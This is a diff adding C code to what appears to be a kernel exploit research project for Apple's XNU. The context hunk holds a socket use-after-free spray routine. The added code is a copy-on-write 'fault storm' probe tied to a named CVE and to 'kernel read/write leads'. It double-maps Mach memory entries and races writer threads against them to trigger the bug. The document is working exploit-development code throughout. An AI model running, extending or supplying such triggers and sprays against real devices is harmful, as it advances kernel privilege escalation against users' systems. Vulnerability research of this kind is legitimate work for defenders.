@@ -75,3 +75,105 @@ int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
     free(buf);
     return made;
 }
+
+/* ---- CoW / external-object fault storm (see analysis/krw-leads/CVE-2026-112576-cow.md) ---- */
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+
+typedef struct {
+    uint8_t *base;
+    uint64_t size;
+    volatile int go;
+} cow_thread_arg_t;
+
+static void *cow_writer(void *p)
+{
+    cow_thread_arg_t *a = (cow_thread_arg_t *)p;
+    while (!a->go) { }
+    uint64_t pages = (a->size + 4095) / 4096;
+    for (uint64_t i = 0; i < pages; i++) {
+        a->base[i * 4096] ^= (uint8_t)(i & 0xff);
+    }
+    return NULL;
+}
+
+/* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
+int cow_probe_run(int rounds, int size_kb, int *stages)
+{
+    int first_kr = 0;
+    vm_map_t self = mach_task_self();
+
+    for (int r = 0; r < rounds; r++) {
+        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
+        mach_port_t entry = MACH_PORT_NULL;
+
+        kern_return_t kr = mach_make_memory_entry_64(
+            self, &size, 0,
+            VM_PROT_READ | VM_PROT_WRITE,
+            &entry, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS) {
+            stages[0]++;
+            if (!first_kr) first_kr = (int)kr;
+            continue;
+        }
+
+        vm_address_t a1 = 0;
+        kr = vm_map(self, &a1, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
+                    entry, 0, FALSE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_INHERIT_NONE);
+        if (kr != KERN_SUCCESS) {
+            stages[1]++;
+            if (!first_kr) first_kr = (int)kr;
+            mach_port_deallocate(self, entry);
+            continue;
+        }
+        memset((void *)a1, 0x5a, size);
+
+        vm_address_t a2 = 0;
+        kr = vm_map(self, &a2, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
+                    entry, 0, FALSE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_INHERIT_NONE);
+        if (kr != KERN_SUCCESS) {
+            stages[2]++;
+            if (!first_kr) first_kr = (int)kr;
+            vm_deallocate(self, a1, (vm_size_t)size);
+            mach_port_deallocate(self, entry);
+            continue;
+        }
+
+        vm_address_t a3 = 0;
+        if (vm_allocate(self, &a3, (vm_size_t)size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
+            kr = vm_copy(self, a1, (vm_size_t)size, a3);
+            if (kr != KERN_SUCCESS) {
+                stages[4]++;
+                if (!first_kr) first_kr = (int)kr;
+            }
+        } else {
+            stages[3]++;
+            if (!first_kr) first_kr = (int)kr;
+        }
+
+        cow_thread_arg_t t1 = { (uint8_t *)a1, size, 0 };
+        cow_thread_arg_t t2 = { (uint8_t *)a2, size, 0 };
+        pthread_t th1, th2;
+        if (pthread_create(&th1, NULL, cow_writer, &t1) == 0 &&
+            pthread_create(&th2, NULL, cow_writer, &t2) == 0) {
+            t1.go = 1; t2.go = 1;
+            pthread_join(th1, NULL); pthread_join(th2, NULL);
+        } else {
+            stages[5]++;
+        }
+
+        vm_deallocate(self, a1, (vm_size_t)size);
+        vm_deallocate(self, a2, (vm_size_t)size);
+        if (a3) vm_deallocate(self, a3, (vm_size_t)size);
+        mach_port_deallocate(self, entry);
+    }
+    return first_kr;
+}
